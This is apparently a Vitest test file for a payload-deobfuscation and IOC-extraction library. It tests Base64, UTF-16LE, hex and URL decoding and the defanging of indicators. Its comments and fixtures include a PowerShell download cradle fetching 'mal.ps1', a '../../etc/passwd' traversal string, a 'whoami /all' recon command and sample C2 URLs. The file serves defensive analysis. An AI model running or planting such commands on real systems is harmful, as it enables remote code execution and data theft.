import { describe, expect, it } from "vitest";
import {
  analyzeAndDecode,
  decodeBase64Utf16Le,
  decodeBase64Utf8,
  decodeHex,
  decodeUrl,
  defangIoc,
  extractIocs,
  refangIoc,
} from "../lib/cyberDecoder";

describe("CyberDecoder — Payload Deobfuscation & Analysis", () => {
  it("decodes standard Base64 UTF-8 payloads", () => {
    // "whoami /all" in Base64
    const b64 = "d2hvYW1pIC9hbGw=";
    const res = decodeBase64Utf8(b64);
    expect(res).toBe("whoami /all");
  });

  it("decodes Windows PowerShell UTF-16LE Base64 payloads", () => {
    // "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/mal.ps1')"
    // In PowerShell UTF-16LE:
    // echo -n "whoami" | iconv -f UTF-8 -t UTF-16LE | base64 -> "dwBoAG8AYQBtAGkA"
    const psB64 = "dwBoAG8AYQBtAGkA";
    const res = decodeBase64Utf16Le(psB64);
    expect(res).toBe("whoami");
  });

  it("decodes hex strings and shellcode byte representations", () => {
    // "\x43\x6d\x64\x2e\x65\x78\x65" -> "Cmd.exe"
    const hexWithPrefix = "\\x43\\x6d\\x64\\x2e\\x65\\x78\\x65";
    expect(decodeHex(hexWithPrefix)).toBe("Cmd.exe");

    // Pure hex "48656c6c6f" -> "Hello"
    const rawHex = "48656c6c6f";
    expect(decodeHex(rawHex)).toBe("Hello");
  });

  it("decodes URL percent-encoded exploit strings", () => {
    const encoded = "%2e%2e%2f%2e%2e%2fetc%2fpasswd";
    expect(decodeUrl(encoded)).toBe("../../etc/passwd");
  });

  it("defangs and refangs IOCs correctly", () => {
    const live = "http://malicious.top/drop.exe";
    const defanged = defangIoc(live);
    expect(defanged).toContain("hxxp://");
    expect(defanged).toContain("malicious[.]top");

    const ip = "192.168.1.100";
    expect(defangIoc(ip)).toBe("192[.]168[.]1[.]100");

    const refanged = refangIoc("hxxps://c2-server[.]xyz/beacon");
    expect(refanged).toBe("https://c2-server.xyz/beacon");
  });

  it("extracts embedded IOCs from decoded strings", () => {
    const text = "Connecting to 10.20.30.40 and downloading from evil-domain.com hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
    const iocs = extractIocs(text);
    const ip = iocs.find((i) => i.type === "ip");
    const domain = iocs.find((i) => i.type === "domain");
    const hash = iocs.find((i) => i.type === "hash");

    expect(ip?.value).toBe("10.20.30.40");
    expect(domain?.value).toBe("evil-domain.com");
    expect(hash?.value).toBe("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
  });

  it("runs end-to-end analyzeAndDecode with candidates", () => {
    const psCommand = "dwBoAG8AYQBtAGkA"; // "whoami" in UTF-16LE
    const analysis = analyzeAndDecode(psCommand);
    expect(analysis.candidates.some((c) => c.id === "b64_utf16" && c.decoded === "whoami")).toBe(true);
  });
});
